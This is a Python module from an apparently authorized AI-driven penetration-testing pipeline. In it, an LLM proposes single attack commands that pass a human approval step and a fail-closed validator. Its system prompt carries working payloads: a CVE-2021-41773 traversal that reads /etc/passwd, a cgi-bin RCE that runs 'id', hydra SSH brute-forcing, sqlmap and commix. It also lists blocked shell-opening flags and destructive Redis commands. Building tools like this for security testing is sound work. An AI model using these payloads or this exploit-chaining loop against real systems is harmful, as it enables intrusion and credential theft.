"""
AI Reasoner — the strategic core (GPT-4o by default, override with
HYDRAMIND_REASONER_MODEL). Reasons about ONE finding at a time, aware of
sibling findings and the history of already-approved/executed actions for the
target, so attack chains build step by step — one human-approved action at a
time — instead of a pre-committed batch plan.

validate_action() is the safety boundary between the AI and the tool
executor: nothing runs unless its proposed command survives it (fail-closed).
"""
from __future__ import annotations
import json
import os
import re
import shlex
from dataclasses import dataclass, asdict
from pathlib import Path

from openai import OpenAI

from engine.findings import Finding

_client = None


def _get_client() -> OpenAI:
    """Lazy init so a missing OPENAI_API_KEY doesn't crash at import time."""
    global _client
    if _client is None:
        _client = OpenAI()  # reads OPENAI_API_KEY from environment
    return _client


# Tools the executor can actually run (Phase 3: curl/sqlmap/redis-cli/hydra/
# wpscan/commix)
KNOWN_TOOLS = {"nmap", "gobuster", "nikto", "curl", "sqlmap", "redis-cli",
               "hydra", "wpscan", "commix"}

# args that write/read files or otherwise escape the intended scan
BLOCKED_NMAP_ARGS = {"-oN", "-oX", "-oG", "-oA", "-oS", "-iL", "--datadir",
                     "--excludefile", "--append-output", "--stylesheet"}
BLOCKED_CURL_FLAGS = {"-o", "-O", "--output", "-T", "--upload-file", "-K",
                      "--config", "-F"}
BLOCKED_SQLMAP_FLAGS = {"--os-shell", "--os-pwn", "--sql-shell",
                        "--file-write", "--file-dest"}
BLOCKED_HYDRA_FLAGS = {"-o", "-M", "-I"}
BLOCKED_WPSCAN_FLAGS = {"-o", "--output"}
BLOCKED_COMMIX_FLAGS = {"--os-shell"}
BLOCKED_REDIS_COMMANDS = {"FLUSHALL", "FLUSHDB", "SHUTDOWN", "DEBUG",
                          "SLAVEOF", "REPLICAOF"}
MAX_ARGS = 20

# one CLI token: any printable characters (URLs carry ? & % [ ]; POST payloads
# carry spaces/semicolons inside one quoted token). No shell ever runs this —
# runner.py uses an argv list — so the real risk is file I/O, handled above.
SAFE_ARG = re.compile(r"^[^\x00-\x1f]{1,200}$")

RISK_LEVELS = ("passive", "active", "exploit")

SYSTEM_PROMPT = """You are the Reasoner — the strategic core of HydraMind, an
AUTHORIZED penetration testing pipeline. You receive ONE finding from the
triage phase, plus context: sibling findings for the same target, and the
history of already-approved/executed actions and their outcomes for that
target.

Decide the single best next action. Chains are good — build on what history
shows succeeded or failed — but propose exactly ONE command.

Available binaries (the first token must be exactly one of these):
- nmap, gobuster, nikto — reconnaissance
- curl — fetch a URL/file or send an HTTP request. Use --path-as-is for
  traversal paths. CVE-2021-41773 (Apache 2.4.49) PoC shapes:
  curl -s --path-as-is 'http://host:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
  curl -s --path-as-is -X POST --data 'echo Content-Type: text/plain; echo; id' \
    'http://host:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
- sqlmap — SQL injection testing. Example:
  sqlmap -u 'http://host:8081/vulnerabilities/sqli/?id=1' --batch
- redis-cli — Redis interaction. Always pass -h <target> -p <port>. Example:
  redis-cli -h 127.0.0.1 -p 6379 INFO
- hydra — credential brute-force. Wordlists must live under
  /usr/share/wordlists. Example:
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://host
- wpscan — WordPress enumeration/vulnerability scanning. Example:
  wpscan --url http://host:8081 --no-banner
- commix — OS command injection testing. Example:
  commix -u 'http://host:8081/vulnerabilities/exec/' \
    --data 'ip=127.0.0.1&Submit=Submit'

Choosing the tool:
- finding says a file/path is accessible (php.ini, robots.txt, .htpasswd,
  /etc/passwd...): use curl to fetch it — NEVER nikto on a file URL.
- service banner has a known CVE (e.g. Apache 2.4.49 / CVE-2021-41773):
  propose the direct PoC with curl (traversal first; RCE via the cgi-bin
  path with a POST payload only after traversal is confirmed).
- open Redis without auth: use redis-cli (PING, INFO, CONFIG GET dir, KEYS *).
- parameterized URL/endpoint: consider sqlmap.
- form/URL that runs a system command (ping, nslookup, exec pages): commix.
- login form or SSH/FTP service: hydra (only with a wordlist under
  /usr/share/wordlists).
- WordPress detected (wp-content, wp-login.php): wpscan.
- do not repeat an action history already shows ran — unless it failed only
  because the port/URL was wrong; then fix the port and retry.

risk_level classification:
- "passive": enumeration (nmap/gobuster/nikto, read-only GET of a public file)
- "active": probing beyond recon (traversal read, redis INFO/CONFIG GET)
- "exploit": payload delivery / RCE / sqlmap / commix / hydra /
  state-changing redis commands

Respond ONLY with valid JSON:
{
  "attack_hypothesis": "<what weakness you hypothesize and why>",
  "exact_tool_and_command": "<ONE exact command, e.g. 'nmap -p 80,443 10.0.0.5'>",
  "expected_outcome": "<what result confirms or refutes the hypothesis>",
  "confidence": 0.7,
  "risk_level": "passive|active|exploit"
}

Hard rules for exact_tool_and_command:
- write the target literally as given in the input — never a placeholder
- never invent URL paths: if the finding is a user-supplied endpoint, use its
  exact URL from the finding/sibling evidence (scheme, host, port, path, query)
- if the findings reference a non-standard web port, use that exact URL in the
  command (e.g. http://host:8081) — never silently assume port 80
- never include credentials, cookies or tokens in the command — the executor
  injects the configured session cookie automatically
- no shell chaining: no ; | && || backticks sudo
- no file input/output arguments (-o, -O, -T, @file, --config)
- if nothing sensible is possible, propose the best passive verification"""


@dataclass
class ReasonerOutput:
    """Spec contract for the Reasoner's structured output."""
    attack_hypothesis: str
    exact_tool_and_command: str
    expected_outcome: str
    confidence: float
    risk_level: str

    def to_dict(self) -> dict:
        return asdict(self)


def _clean_text(value, limit=600) -> str:
    return str(value or "").strip()[:limit]


def reason_about_finding(finding: Finding, full_context: dict) -> ReasonerOutput:
    """
    finding: the single Finding to reason about.
    full_context: {
        "target": str,
        "sibling_findings": [Finding|dict, ...],
        "action_history": [ {tool, risk, description, result, executed}, ... ]
    }
    Returns a validated ReasonerOutput. The exact_tool_and_command still has
    to pass validate_action() before anything executes.
    """
    target = full_context.get("target", finding.target)
    siblings = []
    for s in (full_context.get("sibling_findings") or [])[:10]:
        siblings.append(s.to_dict() if isinstance(s, Finding) else s)
    history = (full_context.get("action_history") or [])[:10]

    user_msg = json.dumps({
        "target": target,
        "finding": finding.to_dict(),
        "context": {"sibling_findings": siblings, "action_history": history},
    }, indent=2, default=str)

    model = os.environ.get("HYDRAMIND_REASONER_MODEL", "gpt-4o")
    response = _get_client().chat.completions.create(
        model=model,
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_msg},
        ],
        temperature=0.3,
        response_format={"type": "json_object"},  # JSON mode → structured output
    )
    return parse_reasoner_output(response.choices[0].message.content)


def parse_reasoner_output(raw: str) -> ReasonerOutput:
    """Parse + normalize the model's JSON. Fail-safe: unknown/missing risk
    becomes 'active' (stricter gate default); confidence clamped to [0,1]."""
    raw = (raw or "").strip()
    if raw.startswith("```"):
        raw = raw.split("```")[1]
        if raw.startswith("json"):
            raw = raw[4:]
    data = json.loads(raw)
    if not isinstance(data, dict):
        raise ValueError("reasoner output is not a JSON object")
    risk = str(data.get("risk_level") or "").strip().lower()
    if risk not in RISK_LEVELS:
        risk = "active"  # fail-safe: unknown risk = stricter approval default
    try:
        confidence = float(data.get("confidence", 0.0))
    except (TypeError, ValueError):
        confidence = 0.0
    confidence = min(max(confidence, 0.0), 1.0)
    return ReasonerOutput(
        attack_hypothesis=_clean_text(data.get("attack_hypothesis")),
        exact_tool_and_command=_clean_text(data.get("exact_tool_and_command"), 300),
        expected_outcome=_clean_text(data.get("expected_outcome")),
        confidence=confidence,
        risk_level=risk,
    )


def validate_action(command: str, target: str) -> dict | None:
    """
    Safety boundary for ONE proposed command. Fail-closed on unknown tools,
    file I/O flags, destructive redis commands and target mismatch.
    Returns {"tool", "args", "command"} or None.
    """
    try:
        tokens = shlex.split(command or "")
    except ValueError:
        return None
    if not tokens:
        return None
    tool = Path(tokens[0]).name.lower()
    if tool not in KNOWN_TOOLS:
        return None
    args = tokens[1:]
    if not args or len(args) > MAX_ARGS:
        return None
    for a in args:
        if not SAFE_ARG.match(a):
            return None
        if tool == "nmap" and (a in BLOCKED_NMAP_ARGS
                               or a.startswith("--datadir")
                               or a.startswith("--excludefile")):
            return None
        if tool == "curl" and (a in BLOCKED_CURL_FLAGS or a.startswith("@")):
            return None
        if tool == "sqlmap" and a in BLOCKED_SQLMAP_FLAGS:
            return None
        if tool == "hydra" and a in BLOCKED_HYDRA_FLAGS:
            return None
        if tool == "wpscan" and a in BLOCKED_WPSCAN_FLAGS:
            return None
        if tool == "commix" and a in BLOCKED_COMMIX_FLAGS:
            return None
        if tool == "redis-cli" and a.upper() in BLOCKED_REDIS_COMMANDS:
            return None
    # the command must actually aim at the scoped target
    if not any(target.lower() in a.lower() for a in args):
        return None
    if tool == "sqlmap" and not ({"-u", "--url"} & set(args)):
        return None
    if tool == "hydra":
        for i, a in enumerate(args):
            if a in ("-P", "-p") and i + 1 < len(args):
                if not args[i + 1].startswith("/usr/share/wordlists/"):
                    return None
    return {"tool": tool, "args": args, "command": command.strip()}
